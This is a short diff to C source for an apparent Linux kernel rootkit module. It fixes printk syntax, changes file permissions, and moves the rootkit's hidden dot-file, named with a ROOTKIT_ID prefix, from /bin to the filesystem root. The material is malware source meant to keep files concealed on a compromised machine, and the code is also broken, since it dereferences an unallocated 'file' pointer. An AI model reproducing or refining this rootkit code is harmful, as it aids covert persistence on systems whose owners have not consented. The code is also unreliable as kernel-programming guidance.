@@ -19,9 +19,9 @@ static struct kern_file *open_file(char *path, int flags){ //opens file from pat
 	struct kern_file *file; //file descriptor
     int err = 0; //error code
 
-	printk("opening file...\n")
-    file->fd = filp_open(path, flags, S_IRUSR); //opens the file in append mode
-	printk("opened file...\n")
+	printk("opening file...\n");
+    file->fd = filp_open(path, flags, 0644); //opens the file in append mode
+	printk("opened file...\n");
     if (IS_ERR(file->fd)) { //if file doesnt exist
 		printk(KERN_DEBUG "error opening file\n");
 		err = PTR_ERR(file->fd); //get error code
@@ -61,7 +61,7 @@ static struct kern_file *open_hidden_file(char *filename){ //opens file in /bin 
 
 	char *path; //char array to hold name of directory
 	path = kzalloc(BUFFER_SIZE, GFP_KERNEL); //allocates memory
-	sprintf(path, "/bin/.%s%s", ROOTKIT_ID, filename); //formats name of directory to be made
+	sprintf(path, "/.%s%s", ROOTKIT_ID, filename); //formats name of directory to be made
 	printk(KERN_DEBUG "path = %s\n", path);
 	hidden_file = open_file(path, O_APPEND | O_RDWR);
 	if (hidden_file==NULL){ //file doesn't exist
